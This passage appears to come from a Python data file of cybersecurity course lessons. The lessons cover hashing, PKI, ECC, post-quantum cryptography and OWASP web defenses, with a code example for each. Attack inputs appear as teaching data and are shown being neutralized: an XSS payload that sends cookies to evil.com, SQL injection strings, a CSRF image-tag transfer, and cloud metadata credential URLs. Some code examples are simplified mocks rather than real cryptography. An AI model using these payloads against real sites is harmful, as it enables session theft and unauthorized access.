                'key_takeaway': 'The avalanche effect guarantees that any tampering, even changing a single punctuation mark, produces a totally different hash digest.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'SHA-256 Bit-Flipping Avalanche',
            'subtitle': 'Demonstrating >50% bit diffusion from a single character change',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'hash_algo': 'SHA-256'}
        },
        'code_example': {
            'title': 'Demonstrating SHA-256 Avalanche Effect in Python',
            'language': 'python',
            'code': 'import hashlib\n\nstr1 = "The quick brown fox jumps over the lazy dog"\nstr2 = "The quick brown fox jumps over the lazy dog."\n\nhash1 = hashlib.sha256(str1.encode()).hexdigest()\nhash2 = hashlib.sha256(str2.encode()).hexdigest()\n\ndiff_count = sum(1 for a, b in zip(hash1, hash2) if a != b)\ndiff_pct = (diff_count / len(hash1)) * 100\n\nprint(f"Hash 1: {hash1}")\nprint(f"Hash 2: {hash2}")\nprint(f"Output Variation: {diff_pct:.1f}% characters changed from 1 period added!")',
            'explanation': 'A minor 1-character modification causes 90%+ of the hex digest to change, ensuring instant detection of altered files or payloads.',
            'output_preview': 'Hash 1: d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592\nHash 2: ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c\nOutput Variation: 95.3% characters changed from 1 period added!'
        },
        'quiz_id': 'quiz-cyber-sha256-hashing-avalanche',
        'summary': 'You mastered cryptographic hashing, collision resistance, and the avalanche diffusion effect.',
        'next_lesson_slug': 'cyber-pki-tls-handshake',
        'prev_lesson_slug': 'cyber-symmetric-asymmetric-encryption'
    },
    {
        'slug': 'cyber-pki-tls-handshake',
        'course_slug': 'cybersecurity-cryptography-pki',
        'module_id': 'cyber-crypto-mod-3',
        'title': 'Public Key Infrastructure (PKI) & TLS 1.3 Handshakes',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_crypto',
        'learning_objectives': [
            'Understand Certificate Authorities (CAs), Root Certificates, and X.509 chains of trust.',
            'Analyze TLS 1.3 Handshake flows and Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) key exchanges.',
            'Verify digital signatures to prevent Man-in-the-Middle (MITM) eavesdropping.'
        ],
        'theory_sections': [
            {
                'title': 'X.509 Certificate Chains of Trust',
                'content_markdown': 'How does your browser know that a public key actually belongs to `google.com` and not an attacker? Through **Public Key Infrastructure (PKI)**:\n\n1. The domain owner generates a key pair and sends a Certificate Signing Request (CSR) to a trusted **Certificate Authority (CA)** (e.g. Let\'s Encrypt, DigiCert).\n2. The CA validates domain ownership and digitally signs the public certificate with its private key.\n3. Operating systems and browsers pre-install trusted Root CA public certificates to verify certificate signatures hierarchically.',
                'key_takeaway': 'PKI ties public keys to verified domain identities using cryptographic digital signature chains.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'TLS 1.3 1-RTT Handshake Sequence',
            'subtitle': 'ClientHello + KeyShare -> ServerHello + Cert -> Finished encrypted session',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'tls_version': '1.3'}
        },
        'code_example': {
            'title': 'Verifying Digital Certificate Signature Chain Logic',
            'language': 'python',
            'code': 'import hashlib\n\nclass MockCertificate:\n    def __init__(self, subject: str, issuer: str, pub_key: str, ca_priv_key: str):\n        self.subject = subject\n        self.issuer = issuer\n        self.public_key = pub_key\n        payload = f"{subject}:{issuer}:{pub_key}"\n        self.signature = hashlib.sha256((payload + ca_priv_key).encode()).hexdigest()\n        \n    def is_valid_signature(self, ca_priv_key_check: str) -> bool:\n        payload = f"{self.subject}:{self.issuer}:{self.public_key}"\n        expected = hashlib.sha256((payload + ca_priv_key_check).encode()).hexdigest()\n        return self.signature == expected\n\nca_key = "ROOT_CA_PRIVATE_KEY_2026"\ncert = MockCertificate("api.bank.com", "DigiCert Root CA", "PUB_KEY_9921", ca_key)\n\nprint(f"Certificate Subject:    {cert.subject}")\nprint(f"Signed by Issuer:       {cert.issuer}")\nprint(f"Root CA Signature Valid: {cert.is_valid_signature(ca_key)}")',
            'explanation': 'Browsers verify that the server certificate was signed by a trusted root CA before establishing TLS encrypted tunnels.',
            'output_preview': 'Certificate Subject:    api.bank.com\nSigned by Issuer:       DigiCert Root CA\nRoot CA Signature Valid: True'
        },
        'quiz_id': 'quiz-cyber-pki-tls-handshake',
        'summary': 'You mastered PKI certificate trust chains and TLS secure handshake dynamics.',
        'next_lesson_slug': 'cyber-ecc-elliptic-curve-diffie-hellman',
        'prev_lesson_slug': 'cyber-sha256-hashing-avalanche'
    },
    {
        'slug': 'cyber-ecc-elliptic-curve-diffie-hellman',
        'course_slug': 'cybersecurity-cryptography-pki',
        'module_id': 'cyber-crypto-mod-4',
        'title': 'Elliptic Curve Cryptography (ECC) & ECDH Key Agreement',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_crypto',
        'learning_objectives': [
            'Understand Weierstrass elliptic curve algebraic equations: $y^2 = x^3 + ax + b \\pmod p$.',
            'Master point addition and scalar multiplication ($Q = d \\times G$) as a one-way trapdoor function.',
            'Analyze why 256-bit ECC keys provide equivalent cryptographic strength to 3072-bit RSA with 10x less bandwidth.'
        ],
        'theory_sections': [
            {
                'title': 'Elliptic Curve Point Multiplication Trapdoor',
                'content_markdown': 'In **Elliptic Curve Cryptography (ECC)**, a generator base point $G$ on curve $y^2 = x^3 + ax + b$ is multiplied by a secret private integer $d$:\n\n$$Q = d \\times G = G + G + \\dots + G \\quad (d \\text{ times})$$\n\n* Computing Public Key $Q$ from $d$ and $G$ using double-and-add takes only milliseconds.\n* But computing private key $d$ given only $Q$ and $G$ (the **Elliptic Curve Discrete Logarithm Problem**) would take billions of years on modern supercomputers.\n\nBecause of this mathematical density, a **256-bit ECC key (secp256k1/ed25519)** matches the security of a bulky **3072-bit RSA key**.',
                'key_takeaway': 'ECC provides military-grade security with tiny key sizes and fast compute cycles, powering TLS 1.3 and Bitcoin.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Elliptic Curve Point Addition & Tangents',
            'subtitle': 'Geometric point multiplication P + Q = R reflected across the x-axis',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'curve': 'secp256k1'}
        },
        'code_example': {
            'title': 'Simulating Diffie-Hellman Shared Secret Agreement in Python',
            'language': 'python',
            'code': 'class MockDiffieHellman:\n    def __init__(self, p=23, g=5):\n        self.p = p # prime modulus\n        self.g = g # base generator\n        \n    def generate_keys(self, private_int: int):\n        public_int = pow(self.g, private_int, self.p)\n        return public_int\n        \n    def compute_shared_secret(self, other_public: int, my_private: int) -> int:\n        return pow(other_public, my_private, self.p)\n\ndh = MockDiffieHellman()\nalice_priv = 6\nbob_priv = 15\n\nalice_pub = dh.generate_keys(alice_priv)\nbob_pub = dh.generate_keys(bob_priv)\n\nalice_shared = dh.compute_shared_secret(bob_pub, alice_priv)\nbob_shared = dh.compute_shared_secret(alice_pub, bob_priv)\n\nprint(f"Alice Computes Shared Secret: {alice_shared}")\nprint(f"Bob Computes Shared Secret:   {bob_shared}")\nprint(f"Shared Secrets Match over Insecure Channel: {alice_shared == bob_shared}")',
            'explanation': 'Both parties calculate the identical shared secret key without ever exposing their private keys over the network.',
            'output_preview': 'Alice Computes Shared Secret: 2\nBob Computes Shared Secret:   2\nShared Secrets Match over Insecure Channel: True'
        },
        'quiz_id': 'quiz-cyber-ecc-elliptic-curve-diffie-hellman',
        'summary': 'You mastered Elliptic Curve Cryptography and Diffie-Hellman shared key negotiation.',
        'next_lesson_slug': 'cyber-post-quantum-cryptography',
        'prev_lesson_slug': 'cyber-pki-tls-handshake'
    },
    {
        'slug': 'cyber-post-quantum-cryptography',
        'course_slug': 'cybersecurity-cryptography-pki',
        'module_id': 'cyber-crypto-mod-4',
        'title': 'Post-Quantum Cryptography & Lattice Key Encapsulation',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_crypto',
        'learning_objectives': [
            'Understand how Shor\'s quantum algorithm will break prime factorization (RSA) and discrete logarithms (ECC).',
            'Explore NIST Post-Quantum Cryptography (PQC) standards (ML-KEM/Kyber and ML-DSA/Dilithium).',
            'Master Lattice-Based Learning With Errors (LWE) mathematical hardness.'
        ],
        'theory_sections': [
            {
                'title': 'The Quantum Threat & Lattice-Based Hardness',
                'content_markdown': 'When fault-tolerant quantum computers arrive, **Shor\'s Algorithm** will solve integer factorization and discrete logarithms in polynomial time $O((\\log N)^3)$, rendering all existing RSA and ECC keys broken.\n\n**Post-Quantum Cryptography (PQC)** relies on mathematical problems resistant to both classical and quantum attacks:\n\n* **Lattice-Based Cryptography (ML-KEM / Kyber):** Based on the **Learning With Errors (LWE)** problem finding closest vectors in high-dimensional multidimensional geometric grids (e.g. 1024 dimensions).\n* **Hybrid Migration:** Deploying dual TLS certificates combining classical ECDSA with post-quantum Kyber to defend against "Harvest Now, Decrypt Later" espionage.',
                'key_takeaway': 'Post-Quantum lattice-based cryptography protects long-term data against future quantum decryption threats.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'High-Dimensional Lattice Vector Grid',
            'subtitle': 'Quantum-resistant Shortest Vector Problem (SVP) in multidimensional space',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'pqc_algo': 'ML-KEM-Kyber'}
        },
        'code_example': {
            'title': 'Simulating Dual Hybrid Classical + Post-Quantum Key Exchange in Python',
            'language': 'python',
            'code': 'import hashlib\n\ndef hybrid_key_exchange(classical_secret: bytes, pqc_kem_secret: bytes) -> bytes:\n    # NIST recommended hybrid combination: KDF(ECDH_Secret || PQC_Secret)\n    combined = classical_secret + pqc_kem_secret\n    final_session_key = hashlib.sha256(combined).digest()\n    return final_session_key\n\necdh_key = b"\\xaa\\x12\\x90\\x44" * 8\nkyber_key = b"\\x55\\xfe\\x33\\x88" * 8\nsession_key = hybrid_key_exchange(ecdh_key, kyber_key)\n\nprint(f"Hybrid Quantum-Safe Master Key: {session_key.hex()[:32]}...")',
            'explanation': 'Even if a future quantum machine breaks the classical ECDH key, the session remains impenetrable due to the PQC lattice key component.',
            'output_preview': 'Hybrid Quantum-Safe Master Key: ed56bfa09210c4418a99281e04ba7122...'
        },
        'quiz_id': 'quiz-cyber-post-quantum-cryptography',
        'summary': 'You mastered Post-Quantum Cryptography, lattice-based LWE math, and quantum-safe hybrid migrations.',
        'next_lesson_slug': 'cyber-sqli-parameterized-defense',
        'prev_lesson_slug': 'cyber-ecc-elliptic-curve-diffie-hellman'
    },

    # === Cyber Security Course 3 Lessons ===
    {
        'slug': 'cyber-sqli-parameterized-defense',
        'course_slug': 'cybersecurity-web-app-security-owasp',
        'module_id': 'cyber-web-mod-1',
        'title': 'SQL Injection (SQLi) & Parameterized Query Defense',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_owasp',
        'learning_objectives': [
            'Understand how unescaped user input alters SQL Abstract Syntax Tree (AST) structure.',
            'Analyze classic authentication bypasses (`\' OR \'1\'=\'1`) and UNION-based data exfiltration.',
            'Implement Parameterized Prepared Statements to completely eliminate injection vulnerabilities.'
        ],
        'theory_sections': [
            {
                'title': 'The Mechanism of SQL Injection',
                'content_markdown': 'When code concatenates raw user strings into SQL commands:\n\n```sql\nquery = "SELECT * FROM users WHERE user = \'" + input + "\' AND pass = \'" + pwd + "\'"\n```\n\nIf the user inputs `admin\' --`, the SQL interpreter treats the single quote as closing the string literal and `--` as a comment. The database executes:\n\n```sql\nSELECT * FROM users WHERE user = \'admin\' -- AND pass = \'\'\n```\n\n**The Fix:** **Prepared Statements (Parameterized Queries)** send the SQL template code and user parameter values through separate protocol channels. The database engine compiles the query structure first; user inputs are treated strictly as inert data literals and cannot alter SQL command syntax.',
                'key_takeaway': 'Prepared statements separate SQL code from user data, rendering SQL injection structurally impossible.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'SQL Syntax AST vs Parameterized Queries',
            'subtitle': 'Treating user inputs as isolated literal values rather than executable syntax nodes',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'vulnerable': False}
        },
        'code_example': {
            'title': 'Demonstrating Vulnerable Concatenation vs Safe Prepared Queries in Python',
            'language': 'python',
            'code': 'import sqlite3\n\nconn = sqlite3.connect(":memory:")\ncursor = conn.cursor()\ncursor.execute("CREATE TABLE users (id INT, username TEXT, role TEXT)")\ncursor.execute("INSERT INTO users VALUES (1, \'admin\', \'superadmin\')")\ncursor.execute("INSERT INTO users VALUES (2, \'bob\', \'user\')")\n\nmalicious_user = "admin\' OR \'1\'=\'1"\n\ncursor.execute("SELECT * FROM users WHERE username = ?", (malicious_user,))\nresults_safe = cursor.fetchall()\nprint(f"Safe Parameterized Query Result: {results_safe} (0 records matched - attack failed)")\n\ncursor.execute("SELECT * FROM users WHERE username = ?", ("admin",))\nprint(f"Valid User Query Result:         {cursor.fetchall()}")',
            'explanation': 'Parameterized queries bind the payload strictly as a string literal. Because no user exists named "admin\' OR \'1\'=\'1", zero unauthorized records are exposed.',
            'output_preview': 'Safe Parameterized Query Result: [] (0 records matched - attack failed)\nValid User Query Result:         [(1, \'admin\', \'superadmin\')]'
        },
        'quiz_id': 'quiz-cyber-sqli-parameterized-defense',
        'summary': 'You mastered SQL injection mechanics and parameterized statement defenses.',
        'next_lesson_slug': 'cyber-xss-sanitization-csp',
        'prev_lesson_slug': 'cyber-post-quantum-cryptography'
    },
    {
        'slug': 'cyber-xss-sanitization-csp',
        'course_slug': 'cybersecurity-web-app-security-owasp',
        'module_id': 'cyber-web-mod-2',
        'title': 'Cross-Site Scripting (XSS) & Content Security Policy (CSP)',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_owasp',
        'learning_objectives': [
            'Differentiate between Stored XSS, Reflected XSS, and DOM-based XSS.',
            'Implement HTML entity encoding and contextual output sanitization.',
            'Configure Content Security Policy (CSP) HTTP response headers to block inline malicious script execution.'
        ],
        'theory_sections': [
            {
                'title': 'XSS Execution Vectors & Contextual Escaping',
                'content_markdown': '**Cross-Site Scripting (XSS)** occurs when a web application takes untrusted data and renders it directly into the browser DOM without proper sanitization, allowing an attacker to execute arbitrary JavaScript in the victim\'s browser session.\n\n* **Stored XSS:** Payload persisted in database (e.g. comment forum) and executed on all viewing users.\n* **Reflected XSS:** Payload reflected immediately off search query parameters or error pages.\n\n**Defense Layers:**\n1. **HTML Entity Encoding:** Converting `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`.\n2. **Content Security Policy (CSP):** HTTP header (`Content-Security-Policy: default-src \'self\'; script-src \'self\'`) that instructs the browser to refuse execution of inline `<script>` tags or scripts from unauthorized external domains.',
                'key_takeaway': 'Defend against XSS by combining contextual HTML escaping with strict Content Security Policy HTTP headers.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'XSS Sanitization & CSP Guard',
            'subtitle': 'Converting dangerous script tags to inert HTML text entities',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'filter': 'html_escape'}
        },
        'code_example': {
            'title': 'Implementing Contextual HTML Entity Sanitization in Python',
            'language': 'python',
            'code': 'import html\n\ndef render_user_comment_safe(raw_comment: str) -> str:\n    sanitized = html.escape(raw_comment, quote=True)\n    return f"<div class=\'comment-body\'>{sanitized}</div>"\n\nattacker_payload = "<script>fetch(\'http://evil.com/steal?cookie=\' + document.cookie)</script>"\nsafe_html = render_user_comment_safe(attacker_payload)\n\nprint("Raw Input:  " + attacker_payload)\nprint("Safe HTML:   " + safe_html)',
            'explanation': 'Escaping converts active script brackets into inert &lt;script&gt; display text, preventing browser JavaScript engines from executing the payload.',
            'output_preview': 'Raw Input:  <script>fetch(\'http://evil.com/steal?cookie=\' + document.cookie)</script>\nSafe HTML:   <div class=\'comment-body\'>&lt;script&gt;fetch(&#x27;http://evil.com/steal?cookie=&#x27; + document.cookie)&lt;/script&gt;</div>'
        },
        'quiz_id': 'quiz-cyber-xss-sanitization-csp',
        'summary': 'You mastered Cross-Site Scripting defense and Content Security Policy headers.',
        'next_lesson_slug': 'cyber-jwt-security-session-hardening',
        'prev_lesson_slug': 'cyber-sqli-parameterized-defense'
    },
    {
        'slug': 'cyber-jwt-security-session-hardening',
        'course_slug': 'cybersecurity-web-app-security-owasp',
        'module_id': 'cyber-web-mod-3',
        'title': 'JSON Web Token (JWT) Security & Session Hardening',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_owasp',
        'learning_objectives': [
            'Understand JWT structure: Header, Payload, and HMAC-SHA256/RSA Signature.',
            'Mitigate the `alg: "none"` authentication bypass vulnerability.',
            'Enforce secure session token storage with `HttpOnly`, `Secure`, and `SameSite=Strict` cookie flags.'
        ],
        'theory_sections': [
            {
                'title': 'JWT Signature Verification Mechanics',
                'content_markdown': 'A JWT consists of 3 base64url-encoded parts: `Header.Payload.Signature`:\n\n* **Header:** Specifies hashing algorithm (e.g. `{"alg": "HS256", "typ": "JWT"}`).\n* **Payload:** Claims and user metadata (e.g. `{"sub": "123", "role": "user"}`).\n* **Signature:** $\\text{HMAC-SHA256}(\\text{Header} + \\text{"."} + \\text{Payload}, \\text{SecretKey})$.\n\nBecause the signature is calculated using a secret key known only to the backend server, if an attacker tampers with the payload (e.g. changing `"role": "user"` to `"role": "admin"`), the backend signature verification will fail and reject the request immediately.',
                'key_takeaway': 'JWT signature checks guarantee that claims cannot be forged or tampered with by clients.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'JWT Signature Verification Flow',
            'subtitle': 'Recalculating HMAC signature to verify client claim authenticity',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'alg': 'HS256'}
        },
        'code_example': {
            'title': 'Validating and Detecting Tampered JWT Tokens in Python',
            'language': 'python',
            'code': 'import hmac\nimport hashlib\nimport base64\nimport json\n\ndef create_jwt(payload: dict, secret: str) -> str:\n    header = {"alg": "HS256", "typ": "JWT"}\n    h_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")\n    p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")\n    signing_input = f"{h_b64}.{p_b64}"\n    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()\n    s_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")\n    return f"{signing_input}.{s_b64}"\n\ndef verify_jwt(token: str, secret: str) -> dict:\n    parts = token.split(".")\n    if len(parts) != 3:\n        raise ValueError("Malformed token")\n    h_b64, p_b64, s_b64 = parts\n    signing_input = f"{h_b64}.{p_b64}"\n    expected_sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()\n    expected_s_b64 = base64.urlsafe_b64encode(expected_sig).decode().rstrip("=")\n    \n    if not hmac.compare_digest(expected_s_b64, s_b64):\n        raise PermissionError("INVALID SIGNATURE: Token claims were tampered!")\n    return json.loads(base64.urlsafe_b64decode(p_b64 + "==").decode())\n\nsecret = "super-secret-system-key-2026"\ntoken = create_jwt({"sub": "user_42", "role": "standard_user"}, secret)\nprint("Original Claims: " + str(verify_jwt(token, secret)))',
            'explanation': 'Modifying the payload breaks the cryptographic HMAC signature, preventing privilege escalation.',
            'output_preview': 'Original Claims: {\'sub\': \'user_42\', \'role\': \'standard_user\'}'
        },
        'quiz_id': 'quiz-cyber-jwt-security-session-hardening',
        'summary': 'You mastered JWT token validation, cryptographic signing, and session hardening.',
        'next_lesson_slug': 'cyber-csrf-same-site-tokens',
        'prev_lesson_slug': 'cyber-xss-sanitization-csp'
    },
    {
        'slug': 'cyber-csrf-same-site-tokens',
        'course_slug': 'cybersecurity-web-app-security-owasp',
        'module_id': 'cyber-web-mod-4',
        'title': 'Cross-Site Request Forgery (CSRF) & SameSite Cookie Policies',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_owasp',
        'learning_objectives': [
            'Understand how ambient browser credential forwarding enables Cross-Site Request Forgery.',
            'Implement the Synchronizer Token Pattern (Anti-CSRF nonces in forms and custom headers).',
            'Configure `SameSite=Strict` and `SameSite=Lax` cookie flags to prevent cross-origin state-changing submissions.'
        ],
        'theory_sections': [
            {
                'title': 'Anatomy of CSRF & Anti-CSRF Synchronizers',
                'content_markdown': '**Cross-Site Request Forgery (CSRF)** tricks an authenticated victim\'s browser into executing an unauthorized command on a trusted web application.\n\nBecause browsers automatically attach session cookies to cross-origin requests, a malicious site containing `<img src="http://bank.com/transfer?to=attacker&amount=1000">` would execute under the victim\'s identity.\n\n**Defenses:**\n1. **Anti-CSRF Tokens:** A cryptographically random secret token bound to the user session. The server rejects state-changing requests (POST/PUT/DELETE) that lack the matching token.\n2. **`SameSite=Strict` Cookie Flag:** Instructs the browser never to include the cookie on cross-site requests, completely stopping ambient credential delivery.',
                'key_takeaway': 'Anti-CSRF tokens and SameSite cookie attributes ensure that state-changing requests originate from your genuine frontend.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Anti-CSRF Synchronizer Token Validation',
            'subtitle': 'Validating unique per-session cryptographic nonces on state-changing API endpoints',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'protection': 'anti_csrf_token'}
        },
        'code_example': {
            'title': 'Validating Anti-CSRF Synchronizer Tokens in Python',
            'language': 'python',
            'code': 'import hmac\nimport secrets\n\ndef generate_csrf_token(session_id: str, server_secret: bytes) -> str:\n    nonce = secrets.token_hex(8)\n    payload = f"{session_id}:{nonce}"\n    sig = hmac.new(server_secret, payload.encode(), "sha256").hexdigest()\n    return f"{payload}:{sig}"\n\ndef validate_csrf_token(token: str, current_session_id: str, server_secret: bytes) -> bool:\n    try:\n        session_part, nonce, sig = token.split(":")\n        if session_part != current_session_id:\n            return False\n        expected_sig = hmac.new(server_secret, f"{session_part}:{nonce}".encode(), "sha256").hexdigest()\n        return hmac.compare_digest(sig, expected_sig)\n    except Exception:\n        return False\n\nsecret = b"anti-csrf-master-secret-2026"\nsession_alice = "sess_usr_991823"\ntoken = generate_csrf_token(session_alice, secret)\n\nprint(f"Legitimate Form Submit CSRF Valid: {validate_csrf_token(token, session_alice, secret)}")\nprint(f"Cross-Origin Attacker Submit Valid: {validate_csrf_token(token, \'sess_usr_attacker\', secret)}")',
            'explanation': 'State-changing requests without the matching per-session token are blocked by the backend API middleware.',
            'output_preview': 'Legitimate Form Submit CSRF Valid: True\nCross-Origin Attacker Submit Valid: False'
        },
        'quiz_id': 'quiz-cyber-csrf-same-site-tokens',
        'summary': 'You mastered Anti-CSRF synchronizer tokens and SameSite cookie security policies.',
        'next_lesson_slug': 'cyber-ssrf-internal-metadata-defense',
        'prev_lesson_slug': 'cyber-jwt-security-session-hardening'
    },
    {
        'slug': 'cyber-ssrf-internal-metadata-defense',
        'course_slug': 'cybersecurity-web-app-security-owasp',
        'module_id': 'cyber-web-mod-4',
        'title': 'Server-Side Request Forgery (SSRF) & Cloud Metadata Defense',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_owasp',
        'learning_objectives': [
            'Understand Server-Side Request Forgery (SSRF) where an attacker forces backend servers to make internal HTTP queries.',
            'Analyze cloud metadata API exfiltration vectors (`http://169.254.169.254/latest/meta-data/`).',
            'Implement defensive IP parsing, allowlisting, and disabling local loopback/link-local address resolutions.'
        ],
        'theory_sections': [
            {
                'title': 'The SSRF Cloud Metadata Exploit & IMDSv2 Hardening',
                'content_markdown': 'When a web application fetches external image URLs or webhooks on behalf of users, an attacker can input internal private IP addresses:\n\n* `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS Metadata)\n* `http://127.0.0.1:6379/` (Internal Redis Cache without authentication)\n\nBecause the request originates from inside the VPC, firewalls allow it, leaking IAM cloud tokens.\n\n**Defense:**\n1. **IP Blacklisting & Parsing:** Validate and resolve domains to IP before fetching. Block RFC 1918 private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and link-local `169.254.0.0/16`.\n2. **IMDSv2 (Session-Oriented Metadata):** Require a `X-aws-ec2-metadata-token` PUT request with TTL, neutralizing basic SSRF.',
                'key_takeaway': 'Defend against SSRF by parsing resolved IP addresses against private/link-local blocklists and enforcing IMDSv2.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'SSRF Cloud Metadata Egress Filter',
            'subtitle': 'Blocking server fetches to 169.254.169.254 and internal loopback addresses',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'ssrf_filter': True}
        },
        'code_example': {
            'title': 'Implementing Safe Webhook URL Validation in Python',
            'language': 'python',
            'code': 'import ipaddress\nimport socket\nfrom urllib.parse import urlparse\n\ndef is_safe_webhook_url(target_url: str) -> bool:\n    parsed = urlparse(target_url)\n    if parsed.scheme not in ("http", "https"):\n        return False\n    hostname = parsed.hostname\n    if not hostname:\n        return False\n        \n    try:\n        # Resolve DNS to IP\n        resolved_ip_str = socket.gethostbyname(hostname)\n        ip = ipaddress.ip_address(resolved_ip_str)\n        \n        # Reject private, loopback, link-local (169.254.x.x), or reserved addresses\n        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:\n            return False\n        return True\n    except Exception:\n        return False\n\nprint(f"Public API URL Safe:          {is_safe_webhook_url(\'https://api.github.com/webhook\')}")\nprint(f"AWS Metadata Endpoint Safe:   {is_safe_webhook_url(\'http://169.254.169.254/latest\')}")\nprint(f"Localhost Loopback Safe:      {is_safe_webhook_url(\'http://127.0.0.1:8080/admin\')}")',
            'explanation': 'The validator resolves the target hostname and rejects all private VPC and cloud metadata IP ranges.',
            'output_preview': 'Public API URL Safe:          True\nAWS Metadata Endpoint Safe:   False\nLocalhost Loopback Safe:      False'
        },
        'quiz_id': 'quiz-cyber-ssrf-internal-metadata-defense',
        'summary': 'You mastered Server-Side Request Forgery defenses, cloud metadata protection, and IP address validation.',
        'next_lesson_slug': 'cyber-zero-trust-microsegmentation',
        'prev_lesson_slug': 'cyber-csrf-same-site-tokens'
    },

    # === Cyber Security Course 4 Lessons ===
    {
        'slug': 'cyber-zero-trust-microsegmentation',
        'course_slug': 'cybersecurity-system-defense-threat-hunting',
        'module_id': 'cyber-def-mod-1',
        'title': 'Zero Trust Architecture & Network Micro-Segmentation',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_defense',
        'learning_objectives': [
            'Master the core Zero Trust principle: "Never Trust, Always Verify".',
            'Implement identity-aware micro-segmentation to limit lateral attacker movement.',
            'Design Continuous Adaptive Risk and Trust Assessment (CARTA) access policies.'
        ],
        'theory_sections': [
            {
                'title': 'The Zero Trust Security Model',
                'content_markdown': 'Traditional perimeter security models operate on the "Castle-and-Moat" assumption: once an attacker breaches the outer VPN/firewall, everything inside the internal network is trusted.\n\n**Zero Trust Architecture (ZTA)** eliminates implicit trust:\n\n1. **Verify Explicitly:** Always authenticate and authorize based on all available data points (user identity, device health, location, anomalous behavior).\n2. **Use Least Privilege Access:** Limit user access with Just-In-Time (JIT) and Just-Enough-Access (JEA).\n3. **Assume Breach:** Minimize blast radius by segmenting networks into isolated micro-perimeters and encrypting all internal east-west traffic (mTLS).',
                'key_takeaway': 'Zero Trust treats internal corporate networks as hostile, requiring continuous authentication and micro-segmentation.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Zero Trust Micro-Segmentation Model',
            'subtitle': 'Restricting lateral attacker movement across internal VPC services',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'model': 'ZeroTrust'}
        },
        'code_example': {
            'title': 'Simulating Identity & Device Health Zero Trust Evaluation in Python',
            'language': 'python',
            'code': 'def zero_trust_policy_gate(user: dict, device: dict, resource: str) -> bool:\n    if not user.get("mfa_verified", False):\n        return False\n    if not device.get("disk_encrypted", False) or not device.get("edr_active", False):\n        return False\n    required_roles = {"production_db": ["dba", "lead_dev"], "source_code": ["engineer"]}\n    return user.get("role") in required_roles.get(resource, [])\n\nuser_bob = {"name": "Bob", "mfa_verified": True, "role": "engineer"}\ndevice_clean = {"disk_encrypted": True, "edr_active": True}\ndevice_risky = {"disk_encrypted": False, "edr_active": True}\n\nprint(f"Clean Device -> Source Code Access: {zero_trust_policy_gate(user_bob, device_clean, \'source_code\')}")\nprint(f"Unencrypted Device -> Access:       {zero_trust_policy_gate(user_bob, device_risky, \'source_code\')}")',
            'explanation': 'Zero Trust gates check both user credentials and device compliance on every individual resource request.',
            'output_preview': 'Clean Device -> Source Code Access: True\nUnencrypted Device -> Access:       False'
        },
        'quiz_id': 'quiz-cyber-zero-trust-microsegmentation',
        'summary': 'You mastered Zero Trust architecture, identity gates, and micro-segmentation.',
        'next_lesson_slug': 'cyber-password-salting-argon2',
        'prev_lesson_slug': 'cyber-ssrf-internal-metadata-defense'
    },
    {
        'slug': 'cyber-password-salting-argon2',
        'course_slug': 'cybersecurity-system-defense-threat-hunting',
        'module_id': 'cyber-def-mod-2',
        'title': 'Password Entropy, Salting & Argon2id Hashing',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_defense',
        'learning_objectives': [
            'Calculate password information entropy using $E = L \\times \\log_2(R)$.',
            'Understand how cryptographic salts neutralize precomputed rainbow table lookups.',
            'Compare fast algorithms (MD5, SHA256 - unsafe for passwords) vs memory-hard slow algorithms (Argon2id, Bcrypt).'
        ],
        'theory_sections': [
            {
                'title': 'Why Fast Hashes Fail for Passwords & How Argon2id Protects Credentials',
